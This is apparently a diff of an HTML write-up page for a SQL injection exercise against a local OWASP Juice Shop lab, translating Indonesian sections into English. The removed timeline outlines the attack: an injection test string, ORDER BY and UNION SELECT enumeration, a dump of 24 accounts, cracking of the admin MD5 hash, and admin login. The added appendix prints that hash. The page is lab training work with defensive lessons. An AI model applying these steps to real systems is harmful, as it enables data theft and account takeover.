+<td>Removes a defence layer against XSS chains</td>
 </tr>
 </tbody>
 </table>
 <hr />
-<h2 id="7-lampiran-timeline">7. Lampiran — Timeline</h2>
-<div class="codehilite"><pre><span></span><code>1. Recon header + fingerprint          → 2 temuan header
-2. Enumerasi endpoint dari main.js     → 15 API + 21 REST
-3. Uji injeksi: apple' vs apple'))--   → INJEKSI TERKONFIRMASI
-4. ORDER BY 9 / 10                     → 9 kolom
-5. UNION SELECT 1..9                   → data arbitrer tampil
-6. sqlite_master                       → 20 tabel
-7. Dump Users                          → 24 akun + hash
-8. Crack md5 admin123                  → cocok
-9. Login admin                         → 200 OK, token terbit
-10. /api/Users dengan token            → 401 → 200, 23 akun
-</code></pre></div>
-
+<h2 id="7-lessons-learned">7. Lessons Learned</h2>
+<p><strong>1. Parameterisation is not optional.</strong>
+Every query that touches user input must use bound parameters. String
+interpolation into SQL is never acceptable, even for "internal" endpoints.</p>
+<p><strong>2. Error messages are a gift to attackers.</strong>
+The moment <code>SQLITE_ERROR: near "'"</code> came back, the injection was confirmed.
+Detailed database errors belong in server logs, not HTTP responses.</p>
+<p><strong>3. <code>200 OK</code> does not mean the request was harmless.</strong>
+Every injected request returned HTTP 200. Status codes tell you nothing about
+whether a request succeeded in ways it should not have.</p>
+<p><strong>4. Verify state, do not assume it.</strong>
+Confirming the admin takeover required logging in and reading a protected
+endpoint — not just cracking a hash. Evidence means observed state change.</p>
 <hr />
-<h2 id="8-pelajaran-dari-latihan-ini">8. Pelajaran dari Latihan Ini</h2>
-<div class="codehilite"><pre><span></span><code>✓ Recon dulu, baru nyerang — endpoint ketemu dari baca main.js
-✓ Uji perbedaan respons (error vs sukses), itu sinyal paling kuat
-✓ ORDER BY itu cara paling cepat cari jumlah kolom
-✓ Buktiin DAMPAK, bukan cuma "ada injeksi"
-   → dump data nyata + login berhasil = laporan yang dibayar
-✓ Catat SEMUA langkah dengan request/response mentah
-✓ Laporan = reviewer bisa reproduksi tanpa mikir
-
-✗ Jangan stop di "SQLi terdeteksi" — lanjut sampai bukti dampak
-✗ Jangan lupa temuan sekunder (header) — sering dibayar terpisah
+<h2 id="8-appendix">8. Appendix</h2>
+<div class="codehilite"><pre><span></span><code>Lab            : OWASP Juice Shop v6.2.0-SNAPSHOT (local)
+Method         : curl + Python (hash verification)
+Column count   : 9
+Tables exposed : 20
+Accounts dumped: 24
+Admin hash     : 0192023a7bbd73250516f069df18b500  (MD5 of "admin123")
+Protected check: /api/Users → 401 without token, 200 with token
 </code></pre></div>
-<div class="crumbs" style="margin-top:52px"><a href="../index.html">← balik ke daftar writeup</a></div>
+<div class="crumbs" style="margin-top:52px"><a href="../index.html">← back to all write-ups</a></div>
 </div></article>
 <footer class="site"><div class="wrap">
-  <span>Portofolio keamanan — latihan lab legal (OWASP Juice Shop).</span>
-  <span class="mono">dibuat 2026-10-09</span>
+  <span>Security research portfolio — testing performed in authorised training labs.</span>
+  <span class="mono">built 2026-10-09</span>
 </div></footer>
 </body>
 </html>
